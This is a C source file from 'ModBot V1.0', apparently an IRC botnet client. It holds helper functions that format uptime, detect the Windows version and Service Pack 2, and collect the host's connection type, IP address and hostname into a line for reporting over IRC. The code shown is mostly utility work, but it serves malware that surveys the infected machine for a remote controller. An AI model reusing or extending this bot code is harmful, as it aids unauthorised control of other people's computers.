/////////////////////////////////////////////////
//              120|-[ModBot]-V1.0             //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *Uptime(int startup)
{
	static char buffer[50];

	DWORD total = GetTickCount() / 1000 - startup;
	DWORD days = total / 86400;
	DWORD hours = (total % 86400) / 3600;
	DWORD minutes = ((total % 86400) % 3600) / 60;
	
	_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);

	return (buffer);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int OSVersionCheck(void)
{ 
	DWORD dwRet = OS_UNKNOWN;

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&verinfo)) {
		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwRet = OS_WIN95;
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) dwRet = OS_WINNT;
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) dwRet = OS_WIN98;
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) dwRet = OS_WINME;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = OS_WIN2K;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = OS_WINXP;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = OS_WIN2K3;
		else dwRet = OS_UNKNOWN;
	} else 
		dwRet = OS_UNKNOWN;

	return (dwRet);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
BOOL checkos() {

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1 && (strstr(verinfo.szCSDVersion, "2") != NULL)) 
		return TRUE;
	else 
		return FALSE;
}

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NETINFO
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *netinfo(char *ninfo, char *host, SOCKET sock)
{
	DWORD n;
	char ctype[8], cname[128];
	memset(cname, 0, sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	_snprintf(ninfo, IRCLINE, "%s [TyPe] %s (%s). [Ip AdDrEsS] %s. [HoStNaMe] %s.", mn_title, ctype, cname, GetIP(sock), host);

	return (ninfo);
}
#endif
/////////////////////////////////////////////////
//              120|-[ModBot]-V1.0             //
///////////////////////////////////////////////// 